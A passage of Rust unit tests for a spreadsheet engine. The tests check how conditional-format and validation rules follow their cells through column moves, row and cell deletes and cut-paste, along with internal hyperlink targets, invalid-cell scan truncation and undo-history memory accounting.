        assert!(ok(&s, at, "5"), "{at} takes 5");
        assert!(!ok(&s, at, "-5"), "{at} refuses -5");
    }
    // Moved left, a whole range of the rule becomes its top-left: the parts left behind still
    // check themselves.
    let mut s = super::tests::s();
    s.execute("data.validation", json!({"range": "B1:B3,D1:D3", "type": "custom", "formula1": "=B1>0"})).unwrap();
    s.execute("sheet.moveColumns", json!({"cols": "D:D", "before": 1})).unwrap();
    for at in ["B1", "C2"] {
        assert!(ok(&s, at, "5"), "{at} takes 5");
        assert!(!ok(&s, at, "-5"), "{at} refuses -5");
    }
}

/// A rule's formulas are written for the top-left of all its ranges: when an edit removes the
/// range holding that cell, the rest re-host from it, not from their own top-left.
#[test]
fn rules_rehost_from_the_top_left_of_all_their_ranges() {
    let texts = |s: &Session| -> (Vec<String>, Vec<String>) {
        let sh = s.doc().unwrap().wb.sheets[0].clone();
        let at = |ranges: &[gridcraft_core::RangeRef]| ranges.iter().map(|r| r.a1()).collect::<Vec<_>>().join(",");
        let cf = sh.cond_formats.iter().map(|c| match &c.rule {
            gridcraft_model::CfRule::Expression { formula, .. } => format!("{}@{}", formula.trim_start_matches('='), at(&c.ranges)),
            _ => String::new(),
        });
        let dv = sh.validations.iter().map(|v| format!("{}@{}", v.f1.trim_start_matches('='), at(&v.ranges)));
        (cf.collect(), dv.collect())
    };
    let setup = || {
        let mut s = super::tests::s();
        s.execute(
            "home.conditionalFormat",
            json!({"range": "A1:A5,C10:C12", "rule": {"type": "expression", "formula": "=A1>0"}, "style": {"fill": "#FFC7CE"}}),
        )
        .unwrap();
        s.execute("data.validation", json!({"range": "A1:A5,E10:E12", "type": "custom", "formula1": "=A1>0"})).unwrap();
        s
    };
    // Deleting the rows of the first area: the second keeps testing itself.
    let mut s = setup();
    s.execute("home.deleteRows", json!({"rows": "1:5"})).unwrap();
    assert_eq!(texts(&s), (vec!["C5>0@C5:C7".to_string()], vec!["E5>0@E5:E7".to_string()]));
    // Deleting the cells of the first area, shifting up or left: the second area stays put.
    for shift in ["up", "left"] {
        let mut s = setup();
        s.execute("home.deleteCells", json!({"range": "A1:A5", "shift": shift})).unwrap();
        assert_eq!(texts(&s), (vec!["C10>0@C10:C12".to_string()], vec!["E10>0@E10:E12".to_string()]), "shift {shift}");
    }
}

/// A cut is pasted as it is: a transposed, tiled or skip-blanks paste of it is refused and
/// changes nothing, so its rules never land on a block of another shape than its cells, nor
/// replace a destination rule under a cell the paste leaves alone.
#[test]
fn a_cut_is_not_transposed_or_tiled() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1:C1", "values": [[1, 2, 3]]})).unwrap();
    s.execute("home.conditionalFormat", json!({"range": "A1:C1", "rule": {"type": "expression", "formula": "=A1>0"}, "style": {"fill": "#FFC7CE"}}))
        .unwrap();
    s.execute("edit.cut", json!({"range": "A1:C1"})).unwrap();
    assert!(s.execute("edit.pasteSpecial", json!({"what": "all", "transpose": true, "at": "E1"})).is_err());
    assert!(s.execute("edit.pasteSpecial", json!({"what": "all", "skipBlanks": true, "at": "E1"})).is_err());
    s.execute("selection.set", json!({"range": "E1:G2"})).unwrap();
    assert!(s.execute("edit.pasteSpecial", json!({"what": "all"})).is_err());
    let sh = s.doc().unwrap().wb.sheets[0].clone();
    assert_eq!(sh.value(CellRef::new(0, 0)), Value::Number(1.0));
    assert_eq!(sh.cond_formats[0].ranges.iter().map(|r| r.a1()).collect::<Vec<_>>(), vec!["A1:C1".to_string()]);
    // Pasted as it is, the rule goes with the cells.
    s.execute("edit.paste", json!({"at": "E1"})).unwrap();
    assert_eq!(s.doc().unwrap().wb.sheets[0].cond_formats[0].ranges.iter().map(|r| r.a1()).collect::<Vec<_>>(), vec!["E1:G1".to_string()]);
}

/// Deleting cells in only the first column of a rule's range shifts its top-left cell and keeps the
/// range's size: the rule's formula follows the cell now there, not the deleted one.
#[test]
fn a_rule_follows_its_top_left_through_a_partial_cell_delete() {
    let mut s = s();
    s.execute("home.conditionalFormat", json!({"range": "A1:C3", "rule": {"type": "expression", "formula": "=A1>0"}, "style": {"fill": "#FFC7CE"}}))
        .unwrap();
    s.execute("data.validation", json!({"range": "A1:C3", "type": "custom", "formula1": "=A1<>B1"})).unwrap();
    s.execute("home.deleteCells", json!({"range": "A1", "shift": "up"})).unwrap();
    let sh = s.doc().unwrap().wb.sheets[0].clone();
    let rule = match &sh.cond_formats[0].rule {
        gridcraft_model::CfRule::Expression { formula, .. } => formula.trim_start_matches('=').to_string(),
        other => panic!("{other:?}"),
    };
    assert_eq!(rule, "A1>0");
    // The cell now at A1 came from A2, which compared itself with B2 (column B didn't move).
    assert_eq!(sh.validations[0].f1.trim_start_matches('='), "A1<>B2");
}

/// A column moved out of a rule's range takes its part of the rule reading what the column read:
/// a rule on B1:D1 testing the cell to its left, with D moved before B, still tests old C (now D)
/// at the moved cell, and a rule on the moved column alone still tests that column.
#[test]
fn a_moved_column_keeps_what_its_part_of_a_rule_reads() {
    let mut s = s();
    s.execute("home.conditionalFormat", json!({"range": "B1:D1", "rule": {"type": "expression", "formula": "=A1>0"}, "style": {"fill": "#FFC7CE"}}))
        .unwrap();
    s.execute("data.validation", json!({"range": "D2", "type": "custom", "formula1": "=D2>0"})).unwrap();
    s.execute("sheet.moveColumns", json!({"cols": "D:D", "before": 1})).unwrap();
    let sh = s.doc().unwrap().wb.sheets[0].clone();
    let mut rules: Vec<String> = sh
        .cond_formats
        .iter()
        .map(|c| match &c.rule {
            gridcraft_model::CfRule::Expression { formula, .. } => {
                format!("{}@{}", formula.trim_start_matches('='), c.ranges.iter().map(|r| r.a1()).collect::<Vec<_>>().join(","))
            }
            other => format!("{other:?}"),
        })
        .collect();
    rules.sort();
    assert_eq!(rules, vec!["A1>0@C1:D1".to_string(), "D1>0@B1".to_string()]);
    assert_eq!(sh.validations[0].f1.trim_start_matches('='), "B2>0");
}

/// Internal hyperlinks keep the place they name as typed, as Excel's "Place in This Document"
/// links do: renaming or deleting a sheet, or inserting rows, leaves them as they were.
#[test]
fn internal_link_targets_stay_as_typed() {
    let mut s = s();
    s.execute("home.insertSheet", json!({"name": "Lists"})).unwrap();
    let one = s.doc().unwrap().wb.sheet_index("Sheet1").unwrap();
    s.execute("insert.link", json!({"cell": "Sheet1!A1", "target": "Lists!B5"})).unwrap();
    s.execute("insert.link", json!({"cell": "Sheet1!A2", "target": "Sheet1!C9"})).unwrap();
    s.execute("home.insertRows", json!({"rows": "1:1", "sheet": "Sheet1"})).unwrap();
    let lists = s.doc().unwrap().wb.sheet_index("Lists").unwrap();
    s.execute("sheet.rename", json!({"sheet": lists, "name": "Data"})).unwrap();
    s.execute("home.deleteSheet", json!({"sheet": lists})).unwrap();
    let wb = &s.doc().unwrap().wb;
    let one = wb.sheet_index("Sheet1").unwrap_or(one);
    let mut targets: Vec<String> = wb.sheets[one].hyperlinks.values().map(|h| h.target.clone()).collect();
    targets.sort();
    assert_eq!(targets, vec!["Lists!B5".to_string(), "Sheet1!C9".to_string()]);
}

#[test]
fn circle_invalid_says_when_its_scan_allowance_ended_early() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [[-1]]})).unwrap();
    s.execute("range.setValues", json!({"range": "A200000", "values": [[-1]]})).unwrap();
    s.execute("data.validation", json!({"range": "A1:A5", "type": "whole", "operator": "greater", "formula1": "0"})).unwrap();
    let out = s.execute("data.circleInvalid", json!({})).unwrap();
    assert_eq!((out["invalid"].as_array().map(Vec::len), out["truncated"].as_bool()), (Some(1), Some(false)), "{out}");
    s.execute("data.validation", json!({"range": "A1:A200000", "type": "whole", "operator": "greater", "formula1": "0"})).unwrap();
    let out = s.execute("data.circleInvalid", json!({})).unwrap();
    assert_eq!(out["truncated"].as_bool(), Some(true), "{out}");
}

#[test]
fn history_charges_a_changed_sheets_comment_text() {
    let mut s = s();
    s.execute("review.newNote", json!({"cell": "A1", "text": "n".repeat(30_000), "author": "Example"})).unwrap();
    let older = (*s.doc().unwrap().wb).clone();
    s.execute("cell.set", json!({"cell": "B2", "input": "x"})).unwrap();
    let newer = (*s.doc().unwrap().wb).clone();
    // The older snapshot owns the comment text now that the sheet changed under it.
    assert!(crate::history_retained_bytes(&older, &newer) >= 30_000);
}

#[test]
fn history_charges_the_storage_of_empty_comment_replies() {
    let mut s = s();
    s.execute("review.newComment", json!({"cell": "A1", "text": "c", "author": "Ann"})).unwrap();
    for _ in 0..500 {
        s.execute("review.replyComment", json!({"cell": "A1", "text": "", "author": ""})).unwrap();
    }
    let sheet = s.doc().unwrap().wb.sheet(0).unwrap().clone();
    // 500 replies of no text are still 500 elements.
    assert!(crate::sheet_text_bytes(&sheet) >= 500 * std::mem::size_of::<(String, String)>());
}
